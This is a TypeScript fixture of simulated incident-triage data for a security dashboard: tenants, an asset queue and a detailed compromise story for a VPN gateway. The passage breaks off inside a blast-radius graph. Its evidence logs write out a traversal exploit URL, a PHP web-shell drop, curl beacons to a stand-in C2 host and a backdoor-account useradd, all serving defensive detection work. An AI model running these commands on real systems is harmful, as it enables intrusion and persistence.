// Auto-generated deterministic offline sandbox for Postern
// Enables instantaneous rendering during cloud cold-starts or network interruptions.

export const FALLBACK_TENANTS = [
  {
    "id": "meridian-finance",
    "name": "Meridian Finance",
    "industry": "Non-Banking Financial Corporation (NBFC)",
    "region": "Mumbai, India"
  },
  {
    "id": "harbor-logistics",
    "name": "Harbor Logistics",
    "industry": "Port & Freight Supply Chain",
    "region": "Chennai, India"
  },
  {
    "id": "lotus-clinics",
    "name": "Lotus Clinics",
    "industry": "Healthcare Provider Network",
    "region": "Bengaluru, India"
  }
];

export const FALLBACK_QUEUE: any[] = [
  {
    "asset_id": "ASSET-MERIDIAN-001",
    "host_name": "meridian-vpn-gw-01",
    "tenant_id": "meridian-finance",
    "owner": "admin@meridianfinance.in",
    "exposure_tier": "emergency",
    "verdict_state": "Likely compromised",
    "confidence": "high",
    "coverage_score": 0.982,
    "gate_outcome": "Contain first then patch",
    "gate_locked": true,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-MERIDIAN-003",
    "host_name": "meridian-web-portal-01",
    "tenant_id": "meridian-finance",
    "owner": "admin@meridianfinance.in",
    "exposure_tier": "emergency",
    "verdict_state": "Cannot verify",
    "confidence": "low",
    "coverage_score": 0.138,
    "gate_outcome": "Patch with caution",
    "gate_locked": false,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-MERIDIAN-015",
    "host_name": "meridian-unkn-asset-01",
    "tenant_id": "meridian-finance",
    "owner": "admin@meridianfinance.in",
    "exposure_tier": "emergency",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.982,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "needs_inventory",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-HARBOR-001",
    "host_name": "harbor-vpn-gw-01",
    "tenant_id": "harbor-logistics",
    "owner": "admin@harborlogistics.in",
    "exposure_tier": "emergency",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.991,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-HARBOR-003",
    "host_name": "harbor-web-portal-01",
    "tenant_id": "harbor-logistics",
    "owner": "admin@harborlogistics.in",
    "exposure_tier": "emergency",
    "verdict_state": "Likely compromised",
    "confidence": "high",
    "coverage_score": 0.982,
    "gate_outcome": "Contain first then patch",
    "gate_locked": true,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-HARBOR-015",
    "host_name": "harbor-unkn-asset-01",
    "tenant_id": "harbor-logistics",
    "owner": "admin@harborlogistics.in",
    "exposure_tier": "emergency",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.987,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "needs_inventory",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-LOTUS-001",
    "host_name": "lotus-vpn-gw-01",
    "tenant_id": "lotus-clinics",
    "owner": "admin@lotusclinics.in",
    "exposure_tier": "emergency",
    "verdict_state": "Likely compromised",
    "confidence": "high",
    "coverage_score": 1.0,
    "gate_outcome": "Contain first then patch",
    "gate_locked": true,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-LOTUS-003",
    "host_name": "lotus-web-portal-01",
    "tenant_id": "lotus-clinics",
    "owner": "admin@lotusclinics.in",
    "exposure_tier": "emergency",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.982,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-LOTUS-015",
    "host_name": "lotus-unkn-asset-01",
    "tenant_id": "lotus-clinics",
    "owner": "admin@lotusclinics.in",
    "exposure_tier": "emergency",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.982,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 43200,
    "is_breached": false,
    "status": "needs_inventory",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-MERIDIAN-002",
    "host_name": "meridian-vpn-gw-02",
    "tenant_id": "meridian-finance",
    "owner": "admin@meridianfinance.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.978,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-MERIDIAN-005",
    "host_name": "meridian-api-server-01",
    "tenant_id": "meridian-finance",
    "owner": "admin@meridianfinance.in",
    "exposure_tier": "high",
    "verdict_state": "Likely compromised",
    "confidence": "high",
    "coverage_score": 0.987,
    "gate_outcome": "Contain first then patch",
    "gate_locked": true,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-MERIDIAN-016",
    "host_name": "meridian-unkn-asset-02",
    "tenant_id": "meridian-finance",
    "owner": "admin@meridianfinance.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.969,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "needs_inventory",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-HARBOR-002",
    "host_name": "harbor-vpn-gw-02",
    "tenant_id": "harbor-logistics",
    "owner": "admin@harborlogistics.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.973,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-HARBOR-005",
    "host_name": "harbor-api-server-01",
    "tenant_id": "harbor-logistics",
    "owner": "admin@harborlogistics.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.973,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-HARBOR-016",
    "host_name": "harbor-unkn-asset-02",
    "tenant_id": "harbor-logistics",
    "owner": "admin@harborlogistics.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.973,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "needs_inventory",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-LOTUS-002",
    "host_name": "lotus-vpn-gw-02",
    "tenant_id": "lotus-clinics",
    "owner": "admin@lotusclinics.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.964,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-LOTUS-005",
    "host_name": "lotus-api-server-01",
    "tenant_id": "lotus-clinics",
    "owner": "admin@lotusclinics.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.973,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "matched",
    "is_approved": false
  },
  {
    "asset_id": "ASSET-LOTUS-016",
    "host_name": "lotus-unkn-asset-02",
    "tenant_id": "lotus-clinics",
    "owner": "admin@lotusclinics.in",
    "exposure_tier": "high",
    "verdict_state": "No evidence found",
    "confidence": "high",
    "coverage_score": 0.964,
    "gate_outcome": "Patch now",
    "gate_locked": false,
    "seconds_remaining": 86400,
    "is_breached": false,
    "status": "needs_inventory",
    "is_approved": false
  }
];

export const FALLBACK_STORIES: Record<string, any> = {
  "ASSET-MERIDIAN-001": {
    "asset": {
      "id": "ASSET-MERIDIAN-001",
      "host_name": "meridian-vpn-gw-01",
      "tenant_id": "meridian-finance",
      "owner": "admin@meridianfinance.in",
      "product": "EdgeGate VPN",
      "version": "9.1.4",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.173",
      "exposure_tier": "emergency",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-01",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-04T03:45:00",
        "source_type": "web",
        "event_action": "crafted_request",
        "signal_class": "access",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-01",
          "timestamp": "2026-10-04T03:45:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "web",
          "event_action": "crafted_request",
          "user_name": "anonymous",
          "process_name": "edgegate_httpd",
          "process_cmdline": "/usr/sbin/edgegate_httpd -D FOREGROUND",
          "file_path": "/api/v1/auth/session",
          "http_method": "POST",
          "url_path": "/api/v1/auth/session?bypass=../../bin/sh",
          "status_code": 200,
          "src_ip": "203.0.113.195",
          "dst_ip": "192.0.2.173",
          "dst_port": 443,
          "network_bytes": 4096
        },
        "content_hash": "a990bc21b76d54c03b7f8d2aac30a53bf51bf7bda954ce067c9927413f9f980e"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-02",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-05T21:40:00",
        "source_type": "file",
        "event_action": "file_write_served_dir",
        "signal_class": "persistence",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-02",
          "timestamp": "2026-10-05T21:40:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "file",
          "event_action": "file_write_served_dir",
          "user_name": "www-data",
          "process_name": "sh",
          "process_cmdline": "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
          "file_path": "/var/www/html/assets/.sys_cache.php",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 1024
        },
        "content_hash": "21c7de7393cc3271c5359e3c9dbe8b5b1b43e2b06c35f53d11cb4a0b555aa806"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-0",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T10:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-0",
          "timestamp": "2026-10-08T10:00:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.173",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "1ef5f94d52d937dfd5df8164564c524ad970cbadb64349ddd831d5d833cd0eb0"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-1",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-1",
          "timestamp": "2026-10-08T09:45:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.173",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "a080c707549c9b1d608d40c9e24402d3d3fe181ba12a13a368ab0ca6612a2918"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-2",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:30:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-2",
          "timestamp": "2026-10-08T09:30:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.173",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "38c23a629d1711716cd47c913cd8170458b0d0751e117400b40f42237c40a37f"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-3",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:15:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-3",
          "timestamp": "2026-10-08T09:15:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.173",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "61d3053a18750e3e36f88eebcdcaf3dd87203e4c52812d710b739551574a6a09"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-4",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-4",
          "timestamp": "2026-10-08T09:00:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.173",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "529c9feee9cd96b2b2e970be74433d940b58e1ceb87020f27c2e925a5540a12f"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-5",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T08:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-03-5",
          "timestamp": "2026-10-08T08:45:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.173",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "aefbb101d3bd3b5b705315b74c6221071a709790f9d9f98d4602ee14d03374e5"
      },
      {
        "event_id": "EV-PLANTED-meridian-vpn-gw-01-04",
        "asset_id": "ASSET-MERIDIAN-001",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-10T17:15:00",
        "source_type": "auth",
        "event_action": "user_add_privileged",
        "signal_class": "privilege_change",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-vpn-gw-01-04",
          "timestamp": "2026-10-10T17:15:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-vpn-gw-01",
          "source_type": "auth",
          "event_action": "user_add_privileged",
          "user_name": "root",
          "process_name": "useradd",
          "process_cmdline": "/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit",
          "file_path": "/etc/passwd",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 0
        },
        "content_hash": "e51be96d742b0b93e176487f4be10dfac5d9e8b0b11ea3ec97ba87afd20ff82f"
      }
    ],
    "coverage": {
      "asset_id": "ASSET-MERIDIAN-001",
      "overall_coverage": 0.982,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 43 of 45 days available",
        "NETWORK: Only 44 of 45 days available",
        "FILE: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-MERIDIAN-001",
      "advisory_id": "SIM-2026-0001",
      "state": "Likely compromised",
      "confidence": "high",
      "reasons": [
        {
          "text": "Pre-authentication exploitation request observed on 2026-10-04T03:45:00 targeting /api/v1/auth/session?bypass=../../bin/sh matching known CVE bypass patterns.",
          "evidence_ids": [
            "EV-PLANTED-meridian-vpn-gw-01-01"
          ]
        },
        {
          "text": "Unauthorized web shell written to served web directory at /var/www/html/assets/.sys_cache.php by service account on 2026-10-05T21:40:00.",
          "evidence_ids": [
            "EV-PLANTED-meridian-vpn-gw-01-02"
          ]
        },
        {
          "text": "Periodic TLS command-and-control beaconing identified to non-standard destination 198.51.100.42:8443.",
          "evidence_ids": [
            "EV-PLANTED-meridian-vpn-gw-01-03-0",
            "EV-PLANTED-meridian-vpn-gw-01-03-1",
            "EV-PLANTED-meridian-vpn-gw-01-03-2",
            "EV-PLANTED-meridian-vpn-gw-01-03-3",
            "EV-PLANTED-meridian-vpn-gw-01-03-4",
            "EV-PLANTED-meridian-vpn-gw-01-03-5"
          ]
        },
        {
          "text": "Dormant administrative user created via command line '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit' on 2026-10-10T17:15:00 to establish post-patch persistence.",
          "evidence_ids": [
            "EV-PLANTED-meridian-vpn-gw-01-04"
          ]
        }
      ],
      "coverage_score": 0.982,
      "coverage_report": {
        "asset_id": "ASSET-MERIDIAN-001",
        "overall_coverage": 0.982,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 43 of 45 days available",
          "NETWORK: Only 44 of 45 days available",
          "FILE: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.072839+00:00",
      "verdict_hash": "1c67c4ca4d0ae5cb3939ac93b8dab9943a3c14a42900197ce51906779c9ba1b5"
    },
    "gate": {
      "asset_id": "ASSET-MERIDIAN-001",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Contain first then patch",
      "gate_locked": true,
      "required_roles": [
        "Incident_Lead",
        "Security_Approver"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.072852+00:00"
    },
    "clock": {
      "asset_id": "ASSET-MERIDIAN-001",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.112858+00:00",
      "deadline_time": "2026-10-19T05:48:03.112858+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-MERIDIAN-001-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-MERIDIAN-001",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate meridian-vpn-gw-01 (192.0.2.173) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-MERIDIAN-001",
      "root_node_id": "meridian-vpn-gw-01",
      "nodes": [
        {
          "id": "meridian-vpn-gw-01",
          "label": "meridian-vpn-gw-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": true
        },
        {
          "id": "meridian-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": true
        },
        {
          "id": "meridian-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "meridian-vpn-gw-01",
          "target": "meridian-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "high"
        },
        {
          "source": "meridian-vpn-gw-01",
          "target": "meridian-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "high"
        },
        {
